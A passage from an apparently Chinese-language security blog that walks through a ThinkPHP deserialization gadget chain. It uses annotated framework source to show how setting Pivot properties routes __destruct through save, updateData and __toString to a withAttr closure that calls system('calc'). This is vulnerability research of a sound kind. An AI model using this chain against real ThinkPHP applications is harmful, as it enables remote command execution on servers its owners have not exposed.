invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) <span class="comment">// ✅ $this-&gt;data 非空；$this-&gt;withEvent = false → trigger 返回 true，不进入</span></span><br><span class="line">        └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;exists)                                   <span class="comment">// ✅ $this-&gt;exists = true，进入分支</span></span><br><span class="line">            └── <span class="title function_ invoke__">updateData</span>(): <span class="keyword">bool</span></span><br><span class="line">                └── <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) <span class="comment">// ✅ $this-&gt;withEvent = false → trigger 返回 true，不进入</span></span><br><span class="line">                └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>()                           <span class="comment">// ✅ 空实现，无操作</span></span><br><span class="line">                └── <span class="title function_ invoke__">getChangedData</span>(): <span class="keyword">array</span>                      <span class="comment">// ✅ 返回的 $data 必须是 array 类型的</span></span><br><span class="line">                    └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;force)                        <span class="comment">// ✅ $this-&gt;force = true</span></span><br><span class="line">                        └── <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;data                  <span class="comment">// ✅ $this-&gt;data = [&#x27;key&#x27; =&gt; [&#x27;key&#x27; =&gt; &#x27;calc&#x27;]]</span></span><br><span class="line">                    └── <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) <span class="comment">// ✅ $this-&gt;readonly = []，不进入循环</span></span><br><span class="line">                    └── <span class="keyword">return</span> <span class="variable">$data</span></span><br><span class="line">                └── <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>))                            <span class="comment">// ✅ $data 非空，不进入</span></span><br><span class="line">                └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) <span class="comment">// ✅ autoWriteTimestamp = null，不进入</span></span><br><span class="line">                └── <span class="title function_ invoke__">checkAllowFields</span>(): <span class="keyword">array</span></span><br><span class="line">                    └── <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field))                <span class="comment">// ✅ field = null，进入</span></span><br><span class="line">                        └── <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema))          <span class="comment">// ✅ schema = null，不进入</span></span><br><span class="line">                            └── <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>(<span class="keyword">array</span> <span class="variable">$scope</span> = [])</span><br><span class="line">                                └── <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">                                └── <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix) <span class="comment">// ✅ $this-&gt;name 为 Pivot 对象，触发 __toString()</span></span><br><span class="line"></span><br><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span>                          <span class="comment">// ✅ 魔术方法入口</span></span><br><span class="line">└── <span class="title function_ invoke__">toJson</span>(<span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE): <span class="keyword">string</span></span><br><span class="line">    └── <span class="title function_ invoke__">toArray</span>(): <span class="keyword">array</span></span><br><span class="line">        └── <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation)   <span class="comment">// ✅ $this-&gt;relation = []，合并后仍为 $this-&gt;data</span></span><br><span class="line">        └── <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)                     <span class="comment">// ✅ $this-&gt;data = [&#x27;key&#x27; =&gt; [&#x27;key&#x27; =&gt; &#x27;calc&#x27;]]</span></span><br><span class="line">            └── <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) <span class="comment">// ✅ hidden = []，hasVisible = false，进入判断</span></span><br><span class="line">                └── <span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span> = <span class="string">&quot;key&quot;</span>)</span><br><span class="line">                    └── <span class="title function_ invoke__">getData</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>)</span><br><span class="line">                        └── <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="string">&quot;key&quot;</span>) <span class="comment">// ✅ strict = true 且无驼峰转换，返回 &quot;key&quot;</span></span><br><span class="line">                        └── <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;key&quot;</span>, <span class="variable">$this</span>-&gt;data))   <span class="comment">// ✅ 命中</span></span><br><span class="line">                            └── <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="string">&quot;key&quot;</span>] = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>]</span><br><span class="line">                    └── <span class="title function_ invoke__">getValue</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>], <span class="keyword">bool</span> <span class="variable">$relation</span> = <span class="literal">false</span>)</span><br><span class="line">                        └── <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="string">&quot;key&quot;</span>) <span class="comment">// ✅ 返回 &quot;key&quot;</span></span><br><span class="line">                        └── <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&quot;key&quot;</span>]))         <span class="comment">// ✅ 存在</span></span><br><span class="line">                            └── <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;key&quot;</span>, <span class="variable">$this</span>-&gt;json))      <span class="comment">// ✅ json = [&quot;key&quot;]</span></span><br><span class="line">                                └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc)              <span class="comment">// ✅ jsonAssoc = true</span></span><br><span class="line">                                    └── <span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$name</span> = <span class="string">&quot;key&quot;</span>, <span class="variable">$value</span> = [<span class="string">&quot;key&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>])</span><br><span class="line">                                        └── <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&quot;key&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$closure</span>) <span class="comment">// ✅ $this-&gt;withAttr[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">                                            └── <span class="variable">$value</span>[<span class="variable">$k</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$k</span>], <span class="variable">$value</span>)       <span class="comment">// ✅ 等价于 system(&quot;calc&quot;) 命令执行点</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析-3"><a href="#调用链分析-3" class="headerlink" title="调用链分析"></a>调用链分析</h3><p>首先在 <code>think\model\Pivot</code> 的 <code>__destruct</code> 方法中，如果 <code>Pivot-&gt;lazySave</code> 为 <code>true</code> 则会调用到 <code>Pivot-&gt;save</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 析构方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123; <span class="comment">// ✅ $this-&gt;lazySave = true 进入判断</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(); <span class="comment">// 👈 调用 $this-&gt;save</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Pivot-&gt;lazySave</code> 函数可以调用到 <code>Pivot-&gt;updateData</code> 函数，不过在此之前需要绕过几个判断。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 保存当前数据对象</span></span><br><span class="line"><span class="comment"> * @access public</span></span><br><span class="line"><span class="comment"> * @param array  $data     数据 = []</span></span><br><span class="line"><span class="comment"> * @param string $sequence 自增序列名 = null</span></span><br><span class="line"><span class="comment"> * @return bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public function <span class="title function_">save</span><span class="params">(<span class="built_in">array</span> $data = [], <span class="built_in">string</span> $sequence = null)</span>: <span class="type">bool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 数据对象赋值</span></span><br><span class="line">    $this-&gt;setAttrs($data); <span class="comment">// ✅ $data = [] 意味着这个函数什么也没做</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($this-&gt;isEmpty() || <span class="comment">// this-&gt;data 非空导致 isEmpty 返回 false</span></span><br><span class="line">        <span class="literal">false</span> === $this-&gt;trigger(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123; <span class="comment">// $this-&gt;withEvent = false =&gt; trigger 返回 false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 📌 $this-&gt;exists = true 调用 $this-&gt;updateData()</span></span><br><span class="line">    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先是 <code>Pivot-&gt;setAttrs</code> ，由于我们调用 <code>save</code> 函数时没有传参，因此 <code>save</code> 函数采用默认参数，即 <code>$data = []</code>，因此 <code>setAttrs</code> 函数的参数 <code>$data</code> 为空数组，因此并没有执行什么逻辑就返回了。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过修改器 批量设置数据对象值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $data  数据 = []</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAttrs</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌  $data = [] 没有进入循环</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就是下面这个判断，我们需要让判断中的两个条件都不满足。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>Pivot-&gt;isEmpty</code> 要求 <code>Pivot-&gt;data</code> 不为空，这里我们随便填一个非空数组即可（这里必须是数组类型是因为后面 <code>getChangedData</code> 有返回值有类型声明）。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断模型是否为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而对于后面的 <code>trigger</code> 我们直接设置 <code>$this-&gt;withEvent = false</code> 即可绕过。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 触发事件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $event 事件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// ✅ $this-&gt;withEvent = false 导致函数返回 true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后我们设置 <code>$this-&gt;exists = true</code> 调用 <code>$this-&gt;updateData</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br></pre></td></tr></table></figure></div>

<p>在 <code>updateData</code> 函数中，我们希望调用到 <code>checkAllowFields</code>，为此同样需要绕过一些判断。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌ $this-&gt;withEvent = false =&gt; $this-&gt;trigger 返回 true =&gt; 不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>(); <span class="comment">// ✅ 空函数什么也不做</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ⚠️ 注意：</span></span><br><span class="line">    <span class="comment">// 1. $this-&gt;force = true 确保返回 $this-&gt;data</span></span><br><span class="line">    <span class="comment">// 2. $this-&gt;readonly 为空防止进入循环干扰</span></span><br><span class="line">    <span class="comment">// 3. $this-&gt;data 类型必须为 array 确保通过返回值类型检测</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123; <span class="comment">// ❌ $data 为非空数组不进入判断</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;autoWriteTimestamp 为空不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>(); <span class="comment">// 👈 调用 checkAllowFields 函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先是 <code>trigger</code> 前面分析过了，可以返回 <code>true</code> 绕过。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ $this-&gt;withEvent = false =&gt; $this-&gt;trigger 返回 true =&gt; 不进入判断</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后 <code>$this-&gt;checkData()</code> 是个空函数什么也没做。</p>
<p>之后是 <code>getChangedData</code>，这里我们可以通过设置 <code>Pivot-&gt;force = true</code> 使其直接返回 <code>$this-&gt;data</code> 即可。不过要注意的是 <strong><code>getChangedData</code> 返回类型被声明为 <code>array</code>，这要求 <code>$this-&gt;data</code> 必须是数组类型的。</strong></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取变化的数据 并排除只读数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span> // 👈 返回值类型比如为 <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 📌 $this-&gt;force = true =&gt; $data = $this-&gt;data</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;readonly 为空，不进入循环</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>; <span class="comment">// 👈 返回 $this-&gt;data 确保类型为 array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再之后几个判断也很好绕过。<code>$data</code> 是来自 <code>getChangedData</code> 返回的 <code>$this-&gt;data</code>，前面已经有要求不为空了。然后 <code>$this-&gt;autoWriteTimestam</code> 默认为 <code>false</code> 也不会进入判断。之后就可以顺利调用到 <code>checkAllowFields</code> 函数了。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $data 来自 getChangedData 返回的 $this-&gt;data 不为空</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123; <span class="comment">// ❌ 不进入判断</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ $this-&gt;autoWriteTimestamp 为空不进入判断</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查允许字段</span></span><br><span class="line"><span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>(); <span class="comment">// 👈 调用 checkAllowFields 函数</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>checkAllowFields</code> 函数中我们希望调用到 <code>db</code> 函数。这就要求我们伪造 <code>$this-&gt;field</code> 和 <code>$this-&gt;schema</code> 都为空。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查数据是否允许写入</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123; <span class="comment">// ✅ $this-&gt;field 为空进入 判断</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123; <span class="comment">// ❌ $this-&gt;schema 为空进入 else</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>(); <span class="comment">// 👈 调用 db 函数</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>db</code> 函数中首先调用的 <code>connect</code> 函数用于<strong>创建或切换数据库连接</strong>，但是由于第二个参数 <code>$force</code> 没有设置，默认不强制重连。因此 <strong><code>connect</code> 函数能够正常执行过去，不会报错</strong>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取当前模型的数据库查询对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $scope 设置不使用的全局查询范围</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Query</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里并不关系 connect 函数逻辑，只要不报错就行</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">        <span class="comment">// 📌 字符串操作触发 $this-&gt;name 的 __toString 函数调用</span></span><br><span class="line">        -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line">    <span class="comment">// [...]        </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后的 <code>$this-&gt;name . $this-&gt;suffix</code> 会调用到 <code>$this-&gt;name</code> 的 <code>__toString</code> 方法。</p>
<p>之后和 RCE1 一样（RCE1 是通过 <code>file_exists</code> 触发的）我们可以调用 <code>Pivot</code> 的 <code>__toString</code> 方法。</p>
<p>由于 <code>Pivot</code> <strong>通过继承抽象类 <code>Model</code><strong>，</strong>而 <code>Model</code> 使用了 <code>think\model\concern\Conversion</code> 和 <code>think\model\concern\Attribute</code> 这两个 trait</strong>，从而获得了这些方法：</p>
<ul>
<li><p><code>Pivot-&gt;__toString</code>：<code>Conversion-&gt;__toString</code></p>
</li>
